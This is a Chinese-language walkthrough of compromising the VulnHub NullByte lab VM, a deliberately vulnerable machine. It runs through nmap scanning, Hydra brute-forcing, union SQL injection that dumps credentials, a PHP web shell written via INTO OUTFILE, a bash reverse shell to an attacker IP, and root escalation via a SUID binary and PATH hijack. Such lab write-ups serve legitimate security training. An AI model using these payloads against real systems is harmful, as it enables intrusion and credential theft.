**靶机地址**：https://www.vulnhub.com/entry/nullbyte-1,126/

**Download (Mirror)**: https://download.vulnhub.com/nullbyte/NullByte.ova.zip

# 信息收集

主机发现

靶机IP：172.16.31.7

![image-20240622164133796](./imgs/image-20240622164133796.png)

端口扫描

```bash
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p-  172.16.31.7
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 04:41 EDT
Nmap scan report for 172.16.31.7
Host is up (0.0021s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
777/tcp   open  multiling-http
44885/tcp open  unknown
MAC Address: 00:0C:29:74:F2:3F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
```

![image-20240622164205834](./imgs/image-20240622164205834.png)

详细信息扫描

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sT -sC -sV -O -p80,111,777,44885 172.16.31.7
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 04:42 EDT
Nmap scan report for 172.16.31.7
Host is up (0.00037s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35934/udp6  status
|   100024  1          36200/udp   status
|   100024  1          37856/tcp6  status
|_  100024  1          44885/tcp   status
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
44885/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:74:F2:3F (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds
```



![image-20240622164318820](./imgs/image-20240622164318820.png)

udp扫描

![image-20240622164437183](./imgs/image-20240622164437183.png)

nmap指定默认脚本漏洞扫描

![image-20240622165124343](./imgs/image-20240622165124343.png)

可以看出枚举出了两个目录

目录扫描

![image-20240622170048085](./imgs/image-20240622170048085.png)

扫出三个目录`javascript\phpmyadmin\uploads`

# WEB渗透

![image-20240622165650050](./imgs/image-20240622165650050.png)

可以采用CTF的思路，将图片另存为，查看图片信息

exiftools工具查看这个文件的创建时间、权限、内容等源数据信息：

![image-20240622170644939](./imgs/image-20240622170644939.png)

![image-20240622171108895](./imgs/image-20240622171108895.png)

可以看到有一行关于内容的字符串kzMb5nVYJw，这个字符串是干啥的呢？可以尝试phpmyadmin的界面的口令、也可以尝试ssh登录root账号，结果都不对

试着当作目录访问一下看看

![image-20240622171319374](./imgs/image-20240622171319374.png)

随便输入点东西，提示key无效

![image-20240622171355874](./imgs/image-20240622171355874.png)

查看其源码

![image-20240622171433065](./imgs/image-20240622171433065.png)

> 提示说：这个表达没有在连接数据库，密码并不复杂

## Hydra爆破

使用hydra脚本爆破，由于是post请求，参数要添加http-form-post，用两个^包围要暴力破解的插值，并写上排除的字段invalid key（即出现哪些字符表示失败）。由于hydra脚本强制要求添加一个-l参数表示login登录账号，我们这里随便填写一个即可（无实际意义，我写的bossfrank），然后-P指定爆破脚本，一般靶机都可选择rockyou这个字典。

```bash
hydra 172.16.31.7 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l bossfrank -P /usr/share/wordlists/rockyou.txt
```

![image-20240622172403103](./imgs/image-20240622172403103.png)

爆破出key是elite

![image-20240622172448617](./imgs/image-20240622172448617.png)

## SQL注入

### 联合查询

输入s ，发现url有了变化，也显示出了内容

![image-20240622172543684](./imgs/image-20240622172543684.png)

输入eqffqfqfqf，页面有了不一样的变化

![image-20240622172640525](./imgs/image-20240622172640525.png)

接下来判断是否存在sql注入

输入`'`，单引号

![image-20240622172748008](./imgs/image-20240622172748008.png)

输入`"`，双引号，页面报SQL语法错误，说明是双引号闭合

![image-20240622172802070](./imgs/image-20240622172802070.png)

payload:`" order by 1 -- -`

![image-20240622172941867](./imgs/image-20240622172941867.png)

payload:`" order by 2 -- -`

![image-20240622172956805](./imgs/image-20240622172956805.png)

payload:`" order by 3 -- -`

![image-20240622173020025](./imgs/image-20240622173020025.png)

payload:`" order by 4 -- -`，报错

![image-20240622173045571](./imgs/image-20240622173045571.png)

> 当前select语句有 3列

接下来判断回显位置

![image-20240622173515079](./imgs/image-20240622173515079.png)、

三个位置都可以回显

```bash
1"   union select database(),user(),version() -- -
```



![image-20240622173636437](./imgs/image-20240622173636437.png)

当前数据库名`seth`

接下来就要一步步获取用户名和密码了

先获取表名

```bash
1" and 1=2  union select database(),user(),group_concat(table_name)  from information_schema.tables where table_schema=database()-- -
```

![image-20240622173952879](./imgs/image-20240622173952879.png)

获取字段名

```bash
1" and 1=2  union select database(),user(),group_concat(column_name)  from information_schema.columns where table_schema=database() and table_name='users' -- -
```



![image-20240622174113697](./imgs/image-20240622174113697.png)

获取用户名

```bash
1" and 1=2  union select group_concat(user),group_concat(pass),group_concat(position)  from users-- -
```



![image-20240622174307321](./imgs/image-20240622174307321.png)

可以看到用户名`ramses`的密码是`YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE`

下面进行解密，使用`hash-identifier`识别不出

![image-20240622174453908](./imgs/image-20240622174453908.png)

[在线解密](https://hashes.com/en/decrypt/hash)

解密两次得到 明文密码`omega`

![image-20240622174603886](./imgs/image-20240622174603886.png)

![image-20240622174619542](./imgs/image-20240622174619542.png)

接下来使用ssh连接尝试，连接成功！

![image-20240622174810593](./imgs/image-20240622174810593.png)

### 一句话木马

> 实际上，注入时能写入文件的前提有两点：
>
> 1.数据库secure_file_priv参数为空，即我们具有写的权限。
>
> 2.需要知道写入文件位置的绝对路径。之前进行目录爆破的时候我们看到了目录uploads，这个目录很可能可以写入。

```bash
1" and 1=2  union select "<?php system($_GET['saury']); ?>",2,3 into outfile "/var/www/html/uploads/shell.php" -- -
```



![image-20240622175245518](./imgs/image-20240622175245518.png)



好像写入成功，通过`saury`参数试试看能否执行命令，

![image-20240622175358924](./imgs/image-20240622175358924.png)

执行成功

通过写入的一句话，查看存在注入页面的`420search.php`

![image-20240622175924653](./imgs/image-20240622175924653.png)

读取成功，发现数据库的密码是sunnyvale，试着登陆phpmyadmin

![image-20240622180022644](./imgs/image-20240622180022644.png)

![image-20240622181346171](./imgs/image-20240622181346171.png)

去解码网站就可以得到用户名密码了

### 反弹shell

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.16.31.3/7896 0>&1'"); ?>
```

payload:

```bash
2" union select "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/172.16.31.3/7896 0>&1'\"); ?>",2,3 into outfile "/var/www/html/uploads/reverse.php" -- -
```

> 特别注意由于php语句是在双引号内，因此php语句中出现的双引号需要加\进转义。

![image-20240622182243491](./imgs/image-20240622182243491.png)



kali监听端口`7896`

浏览器访问`reverse.php`，反弹成功

![image-20240622182328377](./imgs/image-20240622182328377.png)



### sqlmap梭哈

```python
python3 .\sqlmap.py  -u "http://172.16.31.7/kzMb5nVYJw/420search.php?usrtosearch=1"   --dump
```

![image-20240622182706938](./imgs/image-20240622182706938.png) 	

密文解码，就可得到初始权限

# suid提权

先ssh登录ramses，查看历史命令字

![image-20240622182955691](./imgs/image-20240622182955691.png)

发现执行了`procwatch`，查看该文件权限

```bash
 find / -name "procwatch"   2>/dev/null
```



![image-20240622183144430](./imgs/image-20240622183144430.png)

在权限中具有s位，说明该文件运行时具有其属主的权限，也就是root的权限

尝试执行该文件，

![image-20240622183323318](./imgs/image-20240622183323318.png)

首先建立一个软连接，将ps链接到/bin/sh，这样在执行procwatch的时候，无论是sh还是ps都会把root的sh（shell）带出来：

```bash
ln -s /bin/sh ps
```

![image-20240622184043888](./imgs/image-20240622184043888-1719052844830-1.png)

然后我们修改环境变量，将当前目录.追加到环境变量的最开始：

```bash
export PATH=.:$PATH
```

在环境变量的路径越靠前，执行命令时寻找的目录的优先级就越高。也就是说，在我们将当前目录追加到环境变量的最开始位置之后，如果系统运行ps命令（即运行procwatch），会首先在当前目录寻找是否有名为ps的文件，又由于我们在这里添加了软连接，当前目录是存在名为ps的文件的，该文件是个指向sh的软连接，因此可以在当前目录执行ps命令，实际执行的是启动sh。

然后我们运行procwatch，由于procwatch文件具有s权限，会以属主root运行，通过前面的操作可知，运行procwatch会触发sh。因此就相当于以root启动了shell，应该就可以提权了

![image-20240622184240954](./imgs/image-20240622184240954.png)

![image-20240622184259902](./imgs/image-20240622184259902.png)

# 小结



1.主机发现和端口扫描：常规思路，发现ssh端口为777.

2.web渗透，通过查看图片文件的字符串信息发现字符串kzMb5nVYJw，经过尝试发现是web目录，进入后发现有一个文本框需要输入key

3.网页源代码提示key不复杂，使用hydra进行爆破，成功的得到key为elite

4.输入elite后，成功进入了一个用户名查询页面，输入框输入双引号"会触发SQL报错，判断存在SQL注入，可通过四种方式注入，最终拿到ssh的登录凭据。

5.ssh登录，寻找具有s权限的文件，发现/www/var/www/backup/procwatch，通过软连接+修改环境变量的方式对ps指令进行了劫持，运行procwatch即可触发提取。